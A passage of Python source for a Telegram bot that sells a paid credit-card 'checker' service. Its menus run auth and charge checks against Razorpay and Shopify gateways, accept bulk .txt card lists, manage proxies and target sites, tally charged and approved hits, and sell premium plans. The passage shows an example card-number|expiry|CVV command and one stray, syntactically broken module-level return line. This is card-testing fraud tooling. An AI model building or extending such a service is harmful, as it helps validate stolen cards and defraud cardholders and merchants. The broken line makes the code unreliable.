    # ➕🗑 OWNER-ONLY row — sirf ADMIN_ID (owner) ko milti he, normal admin ko NAHI
    if user_id == ADMIN_ID:
        btns.insert(-1, [
            Button.inline("ᴀᴅᴅ ᴀᴅᴍɪɴ", b"adm_addadmin", style="success"),
            Button.inline("ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ", b"adm_rmadmin", style="danger"),
        ])
        btns.insert(-1, [
            Button.inline("\u23f1 ᴀᴜᴛᴏ ᴅᴇʟᴇᴛᴇ", b"adm_autodel", style="primary"),
        ])
        # 🧬 CLONE BOT — OWNER-ONLY premium button
        btns.insert(-1, [
            Button.inline("🧬 ᴄʟᴏɴᴇ ᴢᴏᴛ", b"adm_clonebot", style="primary"),
        ])


    return btns

# ==================== /admin COMMAND ====================
@bot.on(events.NewMessage(pattern='/admin'))
async def admin_panel_cmd(event):
    """Direct admin panel open karne ke liye — /admin likho. Sirf admin."""
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.reply(premium_emoji("❌ **Access Denied**\n\nOnly admins can use this command."))
        return
    _admin_pending.pop(user_id, None)
    await event.reply(premium_emoji(ADMIN_PANEL_TEXT), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    save_user(user_id)

    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"

    if is_admin(user_id):
        plan = "👑 ᴀᴅᴍɪɴ"
        joined = "∞ ʟɪꜰᴇᴛɪᴍᴇ"
        plan_emoji = "👑"
    elif is_premium(user_id):
        plan = "💎 ᴘʀᴇᴍɪᴜᴍ"
        joined = "ᴀᴄᴛɪᴠᴇ"
        plan_emoji = "💎"
    else:
        plan = "⭐ ꜰʀᴇᴇ"
        joined = "ᴛʀɪᴀʟ"
        plan_emoji = "⭐"

    if True:
        welcome_msg = f"""<b></b>
<b>👑 ᴜsᴇʀ: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>✅ ᴜsᴇʀ ɪᴅ: <code>{user_id}</code></b>
<b>{plan_emoji} ᴀᴄᴄᴇss: {plan}</b>
<b>✅ ᴊᴏɪɴᴇᴅ: {joined}</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</b>"""

        main_buttons = [
            [
                Button.inline("ᴄʜᴇᴄᴋᴇʀ", b"checker", style="primary"),
                Button.inline("ʙᴜʏ ɴᴏᴡ", b"buy", style="success"),
            ],
            [
                Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary"),
                Button.inline("sᴜᴘᴘᴏʀᴛ🆘", b"support_menu", style="primary"),
            ],
        ]

        main_buttons.append(
            [
                Button.inline("sʜᴏᴘɪꜰʏ ᴛᴏᴏʟs", b"shop_menu", style="primary"),
                Button.inline("ᴄᴄ ᴄʜᴇᴄᴋ", b"shop_sh", style="success"),
                Button.inline("ᴍᴀss", b"shop_msh", style="danger"),
                Button.inline("ꜰɪʟᴇ", b"shop_mtxt", style="primary"),
            ]
        )
        main_buttons.append(
            [Button.inline("⧸̀ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs (40+)", b"qx_all", style="primary")]
        )
        # ✅ ADMIN PANEL button — only admins see it
        if is_admin(user_id):
            main_buttons.append(
                [Button.inline("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", b"admin_panel", style="danger")]
            )

        try:
            await bot.send_file(
                event.chat_id,
                file=PHOTO_URL,
                caption=premium_emoji(welcome_msg),
                buttons=main_buttons,
                parse_mode="html",
                force_document=False
            )
        except Exception:
            # Fallback: agar video send fail ho, to text message bhejo
            await bot.send_message(
                event.chat_id,
                premium_emoji(welcome_msg),
                buttons=main_buttons,
                parse_mode="html"
            )

# ==================== SUPPORT MENU ====================
@bot.on(events.CallbackQuery(data=b"support_menu"))
async def support_menu(event):
    user_id = event.sender_id
    
    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"

    if is_admin(user_id):
        plan = "👑 ᴀᴅᴍɪɴ"
    elif is_premium(user_id):
        plan = "💎 ᴘʀᴇᴍɪᴜᴍ"
    else:
        plan = "⭐ ꜰʀᴇᴇ"

    support_msg = f"""<b>🆘 sᴜᴘᴘᴏʀᴛ ᴍᴇɴᴜ 🆘</b>
━━━━━━━━━━━━━━━━━━━━
<b>👤 ᴜsᴇʀ: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>🆔 ɪᴅ: <code>{user_id}</code></b>
<b>💠 ᴘʟᴀɴ: {plan}</b>
━━━━━━━━━━━━━━━━━━━━
<b>💎 ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs:</b>
<b>📅 7 ᴅᴀʏs - ₹200</b>
<b>📅 1 ᴍᴏɴᴛʜ - ₹500</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔑 ʀᴇᴅᴇᴇᴍ ᴋᴇʏ:</b>
<code>/redeem KEY_HERE</code>
━━━━━━━━━━━━━━━━━━━━
<b>📞 ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ:</b>
<b>👑 Admin</b>
━━━━━━━━━━━━━━━━━━━━
<b>💳 ᴘᴀʏᴍᴇɴᴛ:</b>
<b>• ᴜᴘɪ • ᴘᴀʏᴘᴀʟ • ᴄʀʏᴘᴛᴏ</b>"""

    support_buttons = [
        [
            Button.url("ʙᴜʏ ᴘʟᴀɴ", OWNER_URL, style="primary"),
            Button.url("ᴄᴏɴᴛᴀᴄᴛ ᴏᴡɴᴇʀ", OWNER_URL, style="primary"),
        ],
        [
            Button.inline("ʙᴀᴄᴋ", b"back_to_start", style="primary"),
        ],
    ]

    await event.edit(
        premium_emoji(support_msg),
        buttons=support_buttons,
        parse_mode="html"
    )


    return locals().get("results", [])  # 🔧 FIX: safe-return (NameError crash tha) # ==================== CHECKER MENU ====================
@bot.on(events.CallbackQuery(data=b"checker"))
async def checker_menu(event):
    checker_buttons = [
        [
            Button.inline("ᴀᴜᴛʜ", b"auth", style="primary"),
            Button.inline("ᴄʜᴀʀɢᴇ", b"charge", style="primary"),
        ],
        [
            Button.inline("ᴍᴀss", b"mass", style="primary"),
        ],
        [
            Button.inline("ʙᴀᴄᴋ", b"back_to_start", style="primary"),
        ]
    ]

    await event.edit(
        premium_emoji("<b>🔒 ᴄʜᴇᴄᴋᴇʀ ᴍᴇɴᴜ 🔒</b>\n\n"
        "<b>👇 sᴇʟᴇᴄᴛ ᴄʜᴇᴄᴋ ᴍᴏᴅᴇ:</b>\n\n"
        "<i>💔 ᴅɪʟ ᴛᴏ ᴀᴀᴊ ʙʜɪ ᴜsɪ ᴋᴀ ʜᴀɪ,</i>\n"
        "<i>🥀 ʙᴀs ʜᴀǫ ᴋɪsɪ ᴀᴜʀ ᴋᴀ ʜᴏ ɢᴀʏᴀ...</i>\n\n"
        "<b>💳 ᴄᴀʀᴅ ᴄʜᴇᴄᴋ ᴍᴏᴅᴇ:</b>"),
        buttons=checker_buttons,
        parse_mode="html"
    )


# ==================== AUTH ====================
@bot.on(events.CallbackQuery(data=b"auth"))
async def auth_handler(event):
    await event.answer("⚡ ᴀᴜᴛʜ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!", alert=True)
    
    auth_msg = f"""<b>⚡💳 ᴀᴜᴛʜ ᴍᴏᴅᴇ ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 ɢᴀᴛᴇᴡᴀʏ: ʀᴀᴢᴏʀᴘᴀʏ</b>
<b>💰 ᴀᴍᴏᴜɴᴛ: ₹1</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 ᴜsᴇ ᴄᴏᴍᴍᴀɴᴅ:</b>
<code>/rz 4097580790933573|06|2030|208</code>
━━━━━━━━━━━━━━━━━━━━
<b>💠 ɢᴀᴛᴇᴡᴀʏ: sʜᴏᴘɪꜰʏ</b>
<b>💰 ᴀᴍᴏᴜɴᴛ: ᴀᴜᴛᴏ ᴜsᴅ</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 ᴜsᴇ ᴄᴏᴍᴍᴀɴᴅ:</b>
<code>/cc 4097580790933573|06|2030|208</code>"""

    await event.edit(premium_emoji(auth_msg), buttons=[[Button.inline("ᴄʜᴇᴄᴋᴇʀ", b"checker", style="primary")]], parse_mode="html")


# ==================== CHARGE ====================
@bot.on(events.CallbackQuery(data=b"charge"))
async def charge_handler(event):
    await event.answer("⚡ ᴄʜᴀʀɢᴇ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ!", alert=True)
    
    charge_msg = f"""<b>⚡💳 ᴄʜᴀʀɢᴇ ᴍᴏᴅᴇ ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>💠 ɢᴀᴛᴇᴡᴀʏ: ʀᴀᴢᴏʀᴘᴀʏ</b>
<b>💰 ᴀᴍᴏᴜɴᴛ: ₹1</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 ᴜsᴇ ᴄᴏᴍᴍᴀɴᴅ:</b>
<code>/rz 4097580790933573|06|2030|208</code>
━━━━━━━━━━━━━━━━━━━━
<b>💠 ɢᴀᴛᴇᴡᴀʏ: sʜᴏᴘɪꜰʏ</b>
<b>💰 ᴀᴍᴏᴜɴᴛ: ᴀᴜᴛᴏ ᴜsᴅ</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 ᴜsᴇ ᴄᴏᴍᴍᴀɴᴅ:</b>
<code>/cc 4097580790933573|06|2030|208</code>"""

    await event.edit(premium_emoji(charge_msg), buttons=[[Button.inline("ᴄʜᴇᴄᴋᴇʀ", b"checker", style="primary")]], parse_mode="html")


# ==================== MASS ====================
@bot.on(events.CallbackQuery(data=b"mass"))
async def mass_handler(event):
    await event.answer("📋 ᴍᴀss ᴄʜᴇᴄᴋ ɪɴꜰᴏ!", alert=True)
    
    mass_msg = f"""<b>⚡ ᴍᴀss ᴄʜᴇᴄᴋ ᴍᴏᴅᴇ ⚡</b>
━━━━━━━━━━━━━━━━━━━━
<b>🔥 sʜᴏᴘɪꜰʏ ʙᴜʟᴋ:</b>
<code>/chk</code> <b>(ʀᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ꜰɪʟᴇ)</b>

<b>💎 ʀᴀᴢᴏʀᴘᴀʏ ʙᴜʟᴋ:</b>
<code>/rzchk</code> <b>(ʀᴇᴘʟʏ ᴛᴏ .ᴛxᴛ ꜰɪʟᴇ)</b>
━━━━━━━━━━━━━━━━━━━━
<b>⚠️ ꜰʀᴇᴇ: 2000 ᴄᴄ | 👑 ᴘʀᴇᴍɪᴜᴍ: ᴜɴʟɪᴍɪᴛᴇᴅ</b>"""

    await event.edit(premium_emoji(mass_msg), buttons=[[Button.inline("ᴄʜᴇᴄᴋᴇʀ", b"checker", style="primary")]], parse_mode="html")


# ==================== BUY ====================
@bot.on(events.CallbackQuery(data=b"buy"))
async def buy_handler(event):
    await event.answer("💎 ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs!", alert=True)
    
    plan_msg = f"""<b>💎 ᴘʀᴇᴍɪᴜᴍ ᴘʟᴀɴs 💎</b>
━━━━━━━━━━━━━━━━━━━━
<b>📅 7 ᴅᴀʏs - ₹200</b>
<b>📅 1 ᴍᴏɴᴛʜ - ₹500</b>
━━━━━━━━━━━━━━━━━━━━
<b>✅ ꜰᴇᴀᴛᴜʀᴇs:</b>
<b>🔥 ᴜɴʟɪᴍɪᴛᴇᴅ ᴄʜᴇᴄᴋs</b>
<b>💎 ʀᴀᴢᴏʀᴘᴀʏ + sʜᴏᴘɪꜰʏ</b>
<b>⚡ ɴᴏ ᴅᴀɪʟʏ ʟɪᴍɪᴛ</b>
<b>👑 ᴘʀɪᴏʀɪᴛʏ sᴜᴘᴘᴏʀᴛ</b>
━━━━━━━━━━━━━━━━━━━━
<b>👑 ᴄᴏɴᴛᴀᴄᴛ: Admin</b>"""

    plan_buttons = [
        [Button.url("💎 ʙᴜʏ ɴᴏᴡ", OWNER_URL, style="success")],
        [Button.inline("ʙᴀᴄᴋ", b"back_to_start", style="primary")],
    ]
    await event.edit(premium_emoji(plan_msg), buttons=plan_buttons, parse_mode="html")


# ==================== BACK TO START ====================
@bot.on(events.CallbackQuery(data=b"back_to_start"))
async def back_to_start(event):
    user_id = event.sender_id

    try:
        sender = await event.get_sender()
        first_name = sender.first_name or "Unknown"
    except:
        first_name = "Unknown"

    if is_admin(user_id):
        plan = "👑 ᴀᴅᴍɪɴ"
        joined = "∞ ʟɪꜰᴇᴛɪᴍᴇ"
        plan_emoji = "👑"
    elif is_premium(user_id):
        plan = "💎 ᴘʀᴇᴍɪᴜᴍ"
        joined = "ᴀᴄᴛɪᴠᴇ"
        plan_emoji = "💎"
    else:
        plan = "⭐ ꜰʀᴇᴇ"
        joined = "ᴛʀɪᴀʟ"
        plan_emoji = "⭐"

    welcome_msg = f"""<b></b>
<b>👑 ᴜsᴇʀ: <a href="tg://user?id={user_id}">{first_name}</a></b>
<b>✅ ᴜsᴇʀ ɪᴅ: <code>{user_id}</code></b>
<b>{plan_emoji} ᴀᴄᴄᴇss: {plan}</b>
<b>✅ ᴊᴏɪɴᴇᴅ: {joined}</b>
━━━━━━━━━━━━━━━━━━━━
<b>👇 sᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ ʙᴇʟᴏᴡ:</b>"""

    main_buttons = [
        [
            Button.inline("ᴄʜᴇᴄᴋᴇʀ", b"checker", style="primary"),
            Button.inline("ʙᴜʏ ɴᴏᴡ", b"buy", style="success"),
        ],
        [
            Button.inline("ᴛᴏᴏʟs", b"tools_menu", style="primary"),
            Button.inline("sᴜᴘᴘᴏʀᴛ🆘", b"support_menu", style="primary"),
        ],
    ]

    # ✅ ADMIN PANEL button in back_to_start — only admins see it
    if is_admin(user_id):
        main_buttons.append(
            [Button.inline("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", b"admin_panel", style="danger")]
        )

    await event.edit(
        premium_emoji(welcome_msg),
        buttons=main_buttons,
        parse_mode="html"
    )
        
# ==================== ADMIN PANEL ====================
# Only admins can open this panel. All admin commands are available as inline
# buttons here so the admin never needs to type "/command" — just tap a button.
# Buttons that need arguments (key / block / unblock / redeem / keystats) open
# a small input prompt; the admin then sends the value and the command runs.
# Buttons use Telegram standard styling without custom-emoji icons.

@bot.on(events.CallbackQuery(data=b"admin_panel"))
async def admin_panel_open(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        await event.answer("⛔ ᴏɴʟʏ ᴀᴅᴍɪɴs", alert=True)
        return
    _admin_pending.pop(user_id, None)
    await event.answer("🔐 ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", alert=False)
    await event.edit(premium_emoji(ADMIN_PANEL_TEXT), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

# ---- direct-action buttons (no args needed) ----
@bot.on(events.CallbackQuery(data=b"adm_stats"))
async def adm_stats(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    # Reuse the existing /stats logic inline
    data = load_hits()
    try:
        conn = sqlite3.connect('users.db'); cur = conn.cursor()
        cur.execute("SELECT COUNT(*) FROM users"); total_users = cur.fetchone()[0]; conn.close()
    except Exception:
        total_users = len(data.get('users', {}))
    tc = data.get('total_charged', 0); ta = data.get('total_approved', 0); td = data.get('total_declined', 0)
    tot = tc + ta + td
    msg = (f"<b>📊 ᴛᴏᴛᴀʟ sᴛᴀᴛs</b>\n━━━━━━━━━━━━━━━━━━━━\n"
           f"🔥 <b>ᴜsᴇʀs:</b> <code>{total_users:,}</code>\n"
           f"⚡ <b>ᴄʜᴇᴄᴋs:</b> <code>{tot:,}</code>\n"
           f"💎 <b>ᴄʜᴀʀɢᴇᴅ:</b> <code>{tc:,}</code>\n"
           f"✅ <b>ᴀᴘᴘʀᴏᴠᴇᴅ:</b> <code>{ta:,}</code>\n"
           f"❌ <b>ᴅᴇᴄʟɪɴᴇᴅ:</b> <code>{td:,}</code>\n━━━━━━━━━━━━━━━━━━━━")
    await event.edit(premium_emoji(msg), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_users"))
async def adm_users(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer("👥 ғᴇᴛᴄʜɪɴɢ...", alert=False)
    # Trigger the existing /users command path by sending it as the bot in same chat
    try:
        await show_users_in_chat(event.chat_id, event.sender_id)
    except Exception as e:
        await event.reply(premium_emoji(f"❌ {str(e)[:60]}"), parse_mode="html")

async def show_users_in_chat(chat_id, admin_id):
    """Render the users list directly into chat_id (used by admin panel button)."""
    status_msg = await bot.send_message(chat_id, premium_emoji("⏳ **Fetching Users List...**"))
    users = []
    try:
        conn = sqlite3.connect('users.db'); cur = conn.cursor()
        # 🔧 FIX (root cause): table me sirf user_id column tha → 4-col SELECT crash → "No users found!"
        cur.execute("SELECT user_id FROM users")
        rows = cur.fetchall(); conn.close()
        for r in rows:
            users.append({"user_id": r[0], "first_name": "User", "username": "", "joined_at": ""})
    except Exception:
        pass
    if not users:
        try:
            for _uid in get_all_users():
                users.append({"user_id": _uid, "first_name": "User", "username": "", "joined_at": ""})
        except Exception:
            pass
    if not users:
        await status_msg.edit(premium_emoji("❌ No users found!"), parse_mode="html"); return
    msg = f"<b>👥 ᴜsᴇʀs ʟɪsᴛ ({len(users)})</b>\n━━━━━━━━━━━━━━━━━━━━\n"
    for idx, u in enumerate(users, 1):
        uname = f"@{u['username']}" if u.get("username") else u.get("first_name")[:15]
        msg += f"{idx}. {uname} → <code>{u['user_id']}</code>\n"
        if idx >= 60:
            msg += f"... +{len(users)-60} more\n"; break
    msg += "━━━━━━━━━━━━━━━━━━━━"
    await status_msg.edit(premium_emoji(msg), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_blocklist"))
async def adm_blocklist(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    try:
        with open(BLOCK_FILE, "r") as f:
            blocked = [l.strip() for l in f if l.strip()]
    except Exception:
        blocked = []
    if not blocked:
        msg = "<b>🚫 ʙʟᴏᴄᴋʟɪsᴛ</b>\n━━━━━━━━━━━━━━━━━━━━\n✅ ɴᴏ ʙʟᴏᴄᴋᴇᴅ ᴜsᴇʀs"
    else:
        msg = f"<b>🚫 ʙʟᴏᴄᴋʟɪsᴛ ({len(blocked)})</b>\n━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(f"<code>{b}</code>" for b in blocked[:60])
    await event.edit(premium_emoji(msg), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_testapis"))
async def adm_testapis(event):
    if not is_owner(event.sender_id):
        await event.answer("⛔ Only owner can use API tests.", alert=True); return
    await event.answer("⚡ ᴛᴇsᴛɪɴɢ ᴀᴘɪs...", alert=False)
    # Run the same logic as /testapis handler directly in this chat
    fake = type("E", (), {"chat_id": event.chat_id, "sender_id": event.sender_id, "reply": (lambda self, *a, **k: bot.send_message(event.chat_id, *a, **k)), "edit": (lambda *a, **k: None)})()
    try:
        await test_all_apis(fake)
    except Exception as e:
        await event.reply(premium_emoji(f"❌ {str(e)[:60]}"), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_checkapi"))
async def adm_checkapi(event):
    if not is_owner(event.sender_id):
        await event.answer("⛔ Only owner can use API checks.", alert=True); return
    await event.answer("🔍 ᴄʜᴇᴄᴋɪɴɢ ᴀᴘɪs...", alert=False)
    fake = type("E", (), {"chat_id": event.chat_id, "sender_id": event.sender_id, "reply": (lambda self, *a, **k: bot.send_message(event.chat_id, *a, **k)), "edit": (lambda *a, **k: None)})()
    try:
        await check_api_now(fake)
    except Exception as e:
        await event.reply(premium_emoji(f"❌ {str(e)[:60]}"), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_myproxies"))
async def adm_myproxies(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    try:
        with open(PROXY_FILE, "r") as f:
            proxies = [l.strip() for l in f if l.strip()]
    except Exception:
        proxies = []
    if not proxies:
        msg = "<b>👥 ᴍʏ ᴘʀᴏxɪᴇs</b>\n━━━━━━━━━━━━━━━━━━━━\n❌ ɴᴏ ᴘʀᴏxɪᴇs"
    else:
        msg = f"<b>👥 ᴘʀᴏxɪᴇs ({len(proxies)})</b>\n━━━━━━━━━━━━━━━━━━━━\n" + "\n".join(f"<code>{p}</code>" for p in proxies[:60])
    await event.edit(premium_emoji(msg), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_clearproxy"))
async def adm_clearproxy(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    try:
        open(PROXY_FILE, "w").close()
        msg = "<b>🧹 ᴘʀᴏxɪᴇs ᴄʟᴇᴀʀᴇᴅ ✅</b>"
    except Exception as e:
        msg = f"❌ {str(e)[:60]}"
    await event.edit(premium_emoji(msg), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_clearsites"))
async def adm_clearsites(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    try:
        open(SITES_FILE, "w").close()
        msg = "<b>🗑 ɢʟᴏʙᴀʟ sɪᴛᴇs ᴄʟᴇᴀʀᴇᴅ ✅</b>"
    except Exception as e:
        msg = f"❌ {str(e)[:60]}"
    await event.edit(premium_emoji(msg), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_myid"))
async def adm_myid(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    await event.edit(premium_emoji(f"<b>🆔 ʏᴏᴜʀ ɪᴅ</b>\n━━━━━━━━━━━━━━━━━━━━\n<code>{event.sender_id}</code>"), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

# ---- arg-based buttons: open an input prompt, then catch the next message ----
async def _ask(event, prompt_text):
    _admin_pending[event.sender_id] = {"type": prompt_text, "chat_id": event.chat_id}
    await event.edit(
        premium_emoji(f"<b>⌨️ ɪɴᴘᴜᴛ ʀᴇǫᴜɪʀᴇᴅ</b>\n━━━━━━━━━━━━━━━━━━━━\n{prompt_text}\n━━━━━━━━━━━━━━━━━━━━\n<i>ʀᴇᴘʟʏ ᴡɪᴛʜ ᴛʜᴇ ᴠᴀʟᴜᴇ ʜᴇʀᴇ 👇</i>"),
        buttons=[[Button.inline("ᴄᴀɴᴄᴇʟ", b"adm_cancel", style="danger")]],
        parse_mode="html"
    )

@bot.on(events.CallbackQuery(data=b"adm_cancel"))
async def adm_cancel(event):
    _admin_pending.pop(event.sender_id, None)
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    await event.edit(premium_emoji(ADMIN_PANEL_TEXT), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

@bot.on(events.CallbackQuery(data=b"adm_genkey"))
async def adm_genkey(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    await _ask(event, "🔑 <b>ɢᴇɴ ᴋᴇʏ</b>\nғᴏʀᴍᴀᴛ: <code>COUNT DAYS DEVICE_LIMIT</code>\nᴇx: <code>1 1 10</code>\n\n👤 Normal admin: max 15 keys / rolling 24h + max 1 day\n👑 Owner: unlimited")

@bot.on(events.CallbackQuery(data=b"adm_redeem"))
async def adm_redeem(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    await _ask(event, "📝 <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b>\nᴘᴀsᴛᴇ ᴛʜᴇ ᴋᴇʏ 👇")

@bot.on(events.CallbackQuery(data=b"adm_keystats"))
async def adm_keystats(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    await _ask(event, "📈 <b>ᴋᴇʏ sᴛᴀᴛs</b>\nᴘᴀsᴛᴇ ᴛʜᴇ ᴋᴇʏ 👇")

@bot.on(events.CallbackQuery(data=b"adm_block"))
async def adm_block(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    await _ask(event, "🚫 <b>ʙʟᴏᴄᴋ ᴜsᴇʀ</b>\nᴜsᴇʀ ɪᴅ 👇")

@bot.on(events.CallbackQuery(data=b"adm_unblock"))
async def adm_unblock(event):
    if not is_admin(event.sender_id):
        await event.answer("⛔", alert=True); return
    await event.answer()
    await _ask(event, "✅ <b>ᴜɴʙʟᴏᴄᴋ ᴜsᴇʀ</b>\nᴜsᴇʀ ɪᴅ 👇")

# ==================== 👑 OWNER-ONLY: ADD / REMOVE ADMIN ====================
# ➕🗑 Sirf OWNER (ADMIN_ID) hi admin add/remove kar sakta he. Normal admin ke paas
# ye buttons panel me dikhti hi nahi + callback pe bhi owner-check he (double security).

@bot.on(events.CallbackQuery(data=b"adm_addadmin"))
async def adm_addadmin(event):
    if event.sender_id != ADMIN_ID:
        await event.answer("⛔ Sirf OWNER hi admin add kar sakta he", alert=True)
        return
    await event.answer()
    await _ask(event, "👑 <b>ᴀᴅᴅ ᴀᴅᴍɪɴ</b>\n👇 jise admin banana he uski USER ID bhejo\n\n<i>ex: 123456789</i>")

@bot.on(events.CallbackQuery(data=b"adm_rmadmin"))
async def adm_rmadmin(event):
    if event.sender_id != ADMIN_ID:
        await event.answer("⛔ Sirf OWNER hi admin remove kar sakta he", alert=True)
        return
    await event.answer()
    await _ask(event, "➖ <b>ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ</b>\n👇 jise admin se remove karna he uski USER ID bhejo\n\n<i>ex: 123456789</i>")

@bot.on(events.CallbackQuery(data=b"adm_admins"))
async def adm_admins(event):
    """👑 Active admins list — ye SAB admins dekh sakte he."""
    if not is_admin(event.sender_id):
        await event.answer("⛔ Only admins", alert=True)
        return
    await event.answer()
    rows = []
    for uid in sorted(KEY_ADMINS):
        tag = " 👑 OWNER" if uid == ADMIN_ID else ""
        try:
            ent = await bot.get_entity(int(uid))
            nm = (getattr(ent, "first_name", None) or getattr(ent, "title", None) or str(uid))
            nm = str(nm).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        except Exception:
            nm = str(uid)
        rows.append('\U0001F464 <a href="tg://user?id=%d">%s</a>%s \u2014 <code>%d</code>' % (uid, nm, tag, uid))
    msg = ("<b>👑 ᴀᴄᴛɪʏᴇ ᴀᴅᴍɪɴs</b>\n"
           "━━━━━━━━━━━━━━━━━━━━\n"
           "<b>ᴛᴏᴛᴀʟ ᴀᴅᴍɪɴs:</b> %d\n"
           "━━━━━━━━━━━━━━━━━━━━\n%s" % (len(KEY_ADMINS), "\n".join(rows)))
    await event.edit(premium_emoji(msg), buttons=_admin_main_buttons(event.sender_id), parse_mode="html")

# ==================== ⏱ OWNER-ONLY: GROUP AUTO-DELETE SETTINGS ====================

@bot.on(events.CallbackQuery(data=b"adm_autodel"))
async def adm_autodel(event):
    if event.sender_id != ADMIN_ID:
        await event.answer("⛔ Sirf OWNER hi auto-delete set kar sakta he", alert=True)
        return
    await event.answer()
    cfg = _gad_load()
    status = "🟢 ON" if cfg["on"] else "🔴 OFF"
    msg = ("<b>⏱ ᴀᴜᴛᴏ ᴅᴇʟᴇᴛᴇ — sᴇᴛᴛɪɴɢs</b>\n"
           "━━━━━━━━━━━━━━━━━━━━\n"
           f"<b>sᴛᴀᴛᴜs:</b> {status}\n"
           f"<b>ᴛɪᴍᴇʀ:</b> {_gad_fmt(cfg['ttl'])}\n"
           "━━━━━━━━━━━━━━━━━━━━\n"
           "<i>Bot ke GROUP messages itne time baad khud delete hote he.\nDM + Channel SAFE — wahan kabhi delete nahi hota.</i>\n"
           "━━━━━━━━━━━━━━━━━━━━\n"
           "<b>⬇ ɴᴇᴡ ᴛɪᴍᴇʀ sᴇʟᴇᴄᴛ ᴋᴀʀᴏ</b>").replace("ᴀᴜᴛᴏ ᴅᴇʟᴇᴛᴇ", "ᴀᴜᴛᴏ ᴅᴇʟᴇᴛᴇ")
    await event.edit(premium_emoji(msg), buttons=_gad_preset_buttons(), parse_mode="html")

def _gad_preset_buttons():
    return [
        [
            Button.inline("OFF", b"adttl_off", style="danger"),
            Button.inline("1 ᴍɪɴ", b"adttl_60", style="primary"),
            Button.inline("5 ᴍɪɴ", b"adttl_300", style="primary"),
            Button.inline("30 ᴍɪɴ", b"adttl_1800", style="primary"),
        ],
        [
            Button.inline("1 ʜᴏᴜʀ", b"adttl_3600", style="success"),
            Button.inline("6 ʜᴏᴜʀs", b"adttl_21600", style="primary"),
            Button.inline("12 ʜᴏᴜʀs", b"adttl_43200", style="primary"),
            Button.inline("24 ʜᴏᴜʀs", b"adttl_86400", style="primary"),
        ],
        [
            Button.inline("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", b"admin_panel", style="primary"),
        ],
    ]

@bot.on(events.CallbackQuery(pattern=re.compile(b"^adttl_(.+)$")))
async def adttl_set(event):
    if event.sender_id != ADMIN_ID:
        await event.answer("⛔ Sirf OWNER hi auto-delete set kar sakta he", alert=True)
        return
    await event.answer("✅", alert=False)
    val = event.pattern_match.group(1).decode("utf-8", "ignore")
    if val == "off":
        _gad_save({"on": False, "ttl": _gad_load()["ttl"]})
        txt = "🔴 <b>AUTO-DELETE OFF</b>\n➜ Group messages ab delete NAHI honge"
    else:
        try:
            ttl = int(val)
        except Exception:
            ttl = 3600
        _gad_save({"on": True, "ttl": ttl})
